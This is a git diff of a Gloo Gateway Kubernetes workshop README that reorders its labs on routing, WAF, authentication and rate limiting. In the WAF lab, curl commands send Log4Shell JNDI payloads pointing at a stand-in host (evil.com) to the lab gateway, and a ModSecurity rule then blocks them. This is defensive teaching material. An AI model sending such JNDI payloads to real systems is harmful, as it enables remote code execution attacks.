@@ -21,18 +21,18 @@ You can find more information about Gloo Gateway in the official documentation:
 ## Table of Contents
 
 * [Introduction](#introduction)
-* [Lab 1 - Deploy Kubernetes cluster](#Lab-1)
-* [Lab 2 - Deploy Gloo Platform](#Lab-2)
-* [Lab 3 - Deploy Gloo API Gateway](#Lab-3)
-* [Lab 4 - Deploy Online Boutique Sample Application](#Lab-4)
-* [Lab 5 - Configure Gloo Platform](#Lab-5)
-* [Lab 6 - Expose Online Boutique](#Lab-6)
-* [Lab 7 - Routing](#Lab-7)
-* [Lab 8 - Web Application Firewall](#Lab-8)
-* [Lab 9 - Authentication / API Key](#Lab-9)
-* [Lab 10 - Authentication / JWT + JWKS](#Lab-10)
-* [Lab 11 - Authentication / OIDC](#Lab-11)
-* [Lab 12 - Rate Limiting](#Lab-12)
+* [Lab 1 - Deploy Kubernetes cluster](#k8s)
+* [Lab 2 - Deploy Gloo Platform](#glooplatform)
+* [Lab 3 - Deploy Online Boutique Sample Application](#onlineboutique)
+* [Lab 4 - Configure Gloo Platform](#workspaces)
+* [Lab 5 - Expose Online Boutique](#expose)
+* [Lab 6 - Routing](#routing)
+* [Lab 7 - Web Application Firewall](#waf)
+* [Lab 8 - Authentication / API Key](#apikey)
+* [Lab 9 - Authentication / JWT + JWKS](#jwt)
+* [Lab 10 - Authentication / OIDC](#oidc)
+* [Lab 11 - Rate Limiting](#ratelimiting)
+* [Lab 12 - GraphQL](#graphql)
 
 ## Begin
 
@@ -56,7 +56,7 @@ export ISTIO_IMAGE_TAG=1.16.3-solo
 export ISTIO_VERSION=1.16.3
 ```
 
-## Lab 1 - Configure/Deploy a Kubernetes cluster <a name="Lab-1"></a>
+## Lab 1 - Configure/Deploy a Kubernetes cluster <a name="k8s"></a>
 
 You will need a single Kubernetes cluster for this workshop.
 
@@ -72,7 +72,7 @@ This workshop can run on many different Kubernetes distributions such as EKS, GK
 kubectl config use-context <context> 
 ```
 
-## Lab 2 - Deploy Gloo Platform <a name="Lab-2"></a>
+## Lab 2 - Deploy Gloo Platform <a name="glooplatform"></a>
 
 ![Gloo Architecture](images/gloo-architecture.png)
 
@@ -168,17 +168,23 @@ export KEYCLOAK_URL=http://$(kubectl -n keycloak get service keycloak -o jsonpat
 printf "\n\nKeycloak OIDC ClientID: $KEYCLOAK_CLIENTID\n\nKeycloak URL: $KEYCLOAK_URL\n"
 ```
 
-## Lab 4 - Deploy Online Boutique Sample Application<a name="Lab-4"></a>
+## Lab 3 - Deploy Online Boutique Sample Application<a name="onlineboutique"></a>
 
 ![Gloo Gateway Architecture](images/gloo-gateway-apps-arch.png)
 
 1. Deploy the Online Boutique microservices to the `online-boutique` namespace.
 
 ```sh
-kubectl apply -f install/online-boutique/deployment.yaml
-```
+helm upgrade --install online-boutique oci://us-central1-docker.pkg.dev/solo-test-236622/solo-demos/onlineboutique \
+  --create-namespace \
+  --namespace online-boutique \
+  --set images.repository=gcr.io/solo-test-236622 \
+  --set images.tag=1.3-http-test \
+  --set frontend.externalService=false \
+  --set frontend.platform=onprem
+ ```
 
-## Lab 5 - Configure Gloo Platform Workspaces <a name="Lab-5"></a>
+## Lab 4 - Configure Gloo Platform Workspaces <a name="workspaces"></a>
 
 ![Workspaces](images/gloo-workspaces.png)
 
@@ -228,7 +234,7 @@ The `WorkspaceSettings` custom resource lets each team define the services and g
 
 Each workspace can have only one WorkspaceSettings resource.
 
-## Lab 6 - Expose the Online Boutique <a name="Lab-6"></a>
+## Lab 5 - Expose the Online Boutique <a name="expose"></a>
 
 ![Expose Online Boutique](images/expose-apps.png)
 
@@ -279,7 +285,7 @@ spec:
   http:
     - name: app-team-ingress
       labels:
-        ingress: "true"
+        ingress: all
       delegate:
         routeTables:
         - workspace: app-team
@@ -322,7 +328,7 @@ printf "\n\nOnline Boutique available at http://$GLOO_GATEWAY\n"
 
 You've successfully exposed the frontend application thru the Gloo Gateway.
 
-## Lab 7 - Routing <a name="Lab-7"></a>
+## Lab 6 - Routing <a name="routing"></a>
 
 ![Routing](images/routing.png)
 
@@ -394,9 +400,9 @@ spec:
           exact: /products
       - uri:
           prefix: /products
-      name: productcatalog
+      name: products
       labels:
-        route: productcatalog
+        route: products
       forwardTo:
         destinations:
           - ref:
@@ -459,6 +465,156 @@ curl --location "$GLOO_GATEWAY/ads" \
   ]
 }'
 ```
+
+## Lab 7 - Web Application Firewall (WAF)<a name="waf"></a>
+
+![Security](images/security.png)
+
+Gloo Gateway utilizes OWASP ModSecurity to add WAF features into the ingress gateway. Not only can you enable the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) easily, but also you can enable many other advanced features to protect your applications.
+
+In this section of the lab, take a quick look at how to prevent the `log4j` exploit that was discovered in late 2021. For more details, you can review the [Gloo Edge blog](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/) that this implementation is based on.
+
+1. Refer to following diagram from Swiss CERT to learn how the `log4j` attack works. Note that a JNDI lookup is inserted into a header field that is logged.
+![log4j exploit](images/log4j_attack.png)
+
+2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
+
+```sh
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/httpbin/get
+```
+
+3. With the Gloo WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
+
+* In the route table, the top level route has the label `ingress: all`. The WAF policy applies to ALL routes through the ingress gateway.
+* In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
+
+```yaml
+kubectl apply -f - <<'EOF'
+apiVersion: security.policy.gloo.solo.io/v2
+kind: WAFPolicy
+metadata:
+  name: log4jshell
+  namespace: online-boutique
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        ingress: all ##### NOTE
+  config:
+    disableCoreRuleSet: true
+    customInterventionMessage: 'Log4Shell malicious payload'
+    customRuleSets:
+    - ruleStr: |-
+        SecRuleEngine On
+        SecRequestBodyAccess On
+        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
+          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://"
+          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+4. Try the previous request again on multiple endpoints
+
+```sh
+# Products API
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/products
+
+# Currency API
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/currencies
+```
+
+Note that the request is now blocked with the custom intervention message from the WAF policy.
+
+```sh
+HTTP/2 403
+content-length: 27
+content-type: text/plain
+date: Wed, 18 May 2022 21:20:34 GMT
+server: istio-envoy
+
+Log4Shell malicious payload
+```
+
+Your frontend app is no longer susceptible to `log4j` attacks, nice!
+
+## Lab 8 - Authentication / API Key <a name="apikey"></a>
+
+API key authentication is one of the easiest forms of authentication to implement. Simply create a Kubernetes secret that contains the key and reference it from the `ExtAuthPolicy`. It is recommended to label the secrets so that multiple can be selected and more can be added later. You can select any header to validate against.
+
+1. Create two secrets that Gloo will validate against. One with the api-key `admin` and the other `developer`.
+
+```yaml
+kubectl apply -f - <<EOF
+apiVersion: v1
+kind: Secret
+metadata:
+  name: solo-admin
+  namespace: online-boutique
+  labels:
+    api-keyset: httpbin-users
+type: extauth.solo.io/apikey
+data:
+  api-key: $(echo -n "admin" | base64)
+---
+apiVersion: v1
+kind: Secret
+metadata:
+  name: solo-developer
+  namespace: online-boutique
+  labels:
+    api-keyset: httpbin-users
+type: extauth.solo.io/apikey
+data:
+  api-key: $(echo -n "developer" | base64)
+EOF
+```
+
+2. Create the API key `ExtAuthPolicy` that will match header `x-api-key` values againt the secrets created above.
+
+```yaml
+kubectl apply -f - <<EOF
+apiVersion: security.policy.gloo.solo.io/v2
+kind: ExtAuthPolicy
+metadata:
+  name: products-apikey
+  namespace: online-boutique
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        route: products
+  config:
+    server:
+      name: ext-auth-server
+      namespace: online-boutique
+      cluster: cluster-1
+    glooAuth:
+      configs:
+      - apiKeyAuth:
+          headerName: x-api-key
+          labelSelector:
+            api-keyset: httpbin-users
+EOF
+```
+
+3. Call httpbin without an api key and you will get a 401 unauthorized message.
+
+```sh
+curl -v http://$GLOO_GATEWAY/products
+```
+
+4. Call httpbin with the developer api key `x-api-key: developer`
+
+```sh
+curl -H "x-api-key: developer" -v http://$GLOO_GATEWAY/products
+```
+
+5. Call httpbin with the admin api key `x-api-key: admin`
+
+```sh
+curl -H "x-api-key: admin" -v http://$GLOO_GATEWAY/products
+```
+
 
 ### Routing to External endpoints
 
@@ -542,152 +698,7 @@ EOF
 curl -v $GLOO_GATEWAY/httpbin/get
 ```
 
-## Lab 8 - Web Application Firewall (WAF)<a name="Lab-8"></a>
-
-![Security](images/security.png)
-
-Gloo Gateway utilizes OWASP ModSecurity to add WAF features into the ingress gateway. Not only can you enable the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) easily, but also you can enable many other advanced features to protect your applications.
-
-In this section of the lab, take a quick look at how to prevent the `log4j` exploit that was discovered in late 2021. For more details, you can review the [Gloo Edge blog](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/) that this implementation is based on.
-
-1. Refer to following diagram from Swiss CERT to learn how the `log4j` attack works. Note that a JNDI lookup is inserted into a header field that is logged.
-![log4j exploit](images/log4j_attack.png)
-
-2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
-
-```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/httpbin/get
-```
-
-3. With the Gloo WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
-
-* In the route table, the frontend route has the label `route: httpbin`. The WAF policy applies to routes with this same label.
-* In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
-
-```yaml
-kubectl apply -f - <<'EOF'
-apiVersion: security.policy.gloo.solo.io/v2
-kind: WAFPolicy
-metadata:
-  name: log4jshell
-  namespace: online-boutique
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        route: httpbin ##### NOTE
-  config:
-    disableCoreRuleSet: true
-    customInterventionMessage: 'Log4Shell malicious payload'
-    customRuleSets:
-    - ruleStr: |-
-        SecRuleEngine On
-        SecRequestBodyAccess On
-        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*
-          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://"
-          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
-EOF
-```
-
-4. Try the previous request again.
-
-```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/httpbin/get
-```
-
-Note that the request is now blocked with the custom intervention message from the WAF policy.
-
-```sh
-HTTP/2 403
-content-length: 27
-content-type: text/plain
-date: Wed, 18 May 2022 21:20:34 GMT
-server: istio-envoy
-
-Log4Shell malicious payload
-```
-
-Your frontend app is no longer susceptible to `log4j` attacks, nice!
-
-### Lab 9 - Authentication / API Key <a name="Lab-9"></a>
-
-API key authentication is one of the easiest forms of authentication to implement. Simply create a Kubernetes secret that contains the key and reference it from the `ExtAuthPolicy`. It is recommended to label the secrets so that multiple can be selected and more can be added later. You can select any header to validate against.
-
-1. Create two secrets that Gloo will validate against. One with the api-key `admin` and the other `developer`.
-
-```yaml
-kubectl apply -f - <<EOF
-apiVersion: v1
-kind: Secret
-metadata:
-  name: solo-admin
-  namespace: online-boutique
-  labels:
-    api-keyset: httpbin-users
-type: extauth.solo.io/apikey
-data:
-  api-key: $(echo -n "admin" | base64)
----
-apiVersion: v1
-kind: Secret
-metadata:
-  name: solo-developer
-  namespace: online-boutique
-  labels:
-    api-keyset: httpbin-users
-type: extauth.solo.io/apikey
-data:
-  api-key: $(echo -n "developer" | base64)
-EOF
-```
-
-2. Create the API key `ExtAuthPolicy` that will match header `x-api-key` values againt the secrets created above.
-
-```yaml
-kubectl apply -f - <<EOF
-apiVersion: security.policy.gloo.solo.io/v2
-kind: ExtAuthPolicy
-metadata:
-  name: httpbin-apikey
-  namespace: online-boutique
-spec:
-  applyToRoutes:
-  - route:
-      labels:
-        route: httpbin
-  config:
-    server:
-      name: ext-auth-server
-      namespace: online-boutique
-      cluster: cluster-1
-    glooAuth:
-      configs:
-      - apiKeyAuth:
-          headerName: x-api-key
-          labelSelector:
-            api-keyset: httpbin-users
-EOF
-```
-
-3. Call httpbin without an api key and you will get a 401 unauthorized message.
-
-```sh
-curl -v http://$GLOO_GATEWAY/httpbin/get
-```
-
-4. Call httpbin with the developer api key `x-api-key: developer`
-
-```sh
-curl -H "x-api-key: developer" -v http://$GLOO_GATEWAY/httpbin/get
-```
-
-5. Call httpbin with the admin api key `x-api-key: admin`
-
-```sh
-curl -H "x-api-key: admin" -v http://$GLOO_GATEWAY/httpbin/get
-```
-
-## Lab 10 - Authentication / JWT + JWKS<a name="Lab-10"></a>
+## Lab 9 - Authentication / JWT + JWKS<a name="jwt"></a>
 
 JWT authentication using JSON web key sets (JWKS) is a much more robust mechanism for authentication as keys can be shorter lived / rotated and the validation is done against rotating keys. Also more information can be stored in JWTs vs API keys. In this example Auth0 is used as the JWT signer and JWKS provider. 
 
@@ -784,10 +795,20 @@ curl -X POST -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units":
 5. Call currency service with an access token
 
 ```sh
-curl -H "Authorization: Bearer ${ACCESS_TOKEN}" -X POST -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY/currencies/convert
+curl -H "Authorization: Bearer ${ACCESS_TOKEN}" --location "$GLOO_GATEWAY/currencies/convert" \
+--header 'Content-Type: application/json' \
+--header 'Accept: application/json' \
+--data '{
+  "from": {
+    "currency_code": "USD",
+    "nanos": 0,
+    "units": 8
+  },
+  "to_code": "EUR"
+}'
 ```
 
-## Lab 11 - Authentication / OIDC<a name="Lab-11"></a>
+## Lab 10 - Authentication / OIDC<a name="oidc"></a>
 
 ![Keycloak](images/keycloak.png)
 
@@ -872,7 +893,7 @@ And the application is now accessible.
 
 7. When you are finished, click the 'logout' button in the top right corner of the screen.
 
-## Lab 12 - Rate Limiting<a name="Lab-12"></a>
+## Lab 11 - Rate Limiting<a name="ratelimiting"></a>
 
 ![Rate Limiting](images/rate-limiter.png)
 
@@ -958,3 +979,6 @@ date: Sun, 05 Jun 2022 18:50:53 GMT
 server: istio-envoy
 x-envoy-upstream-service-time: 7
 ```
+
+
+## Lab 12 - Graphql<a name="graphql"></a>
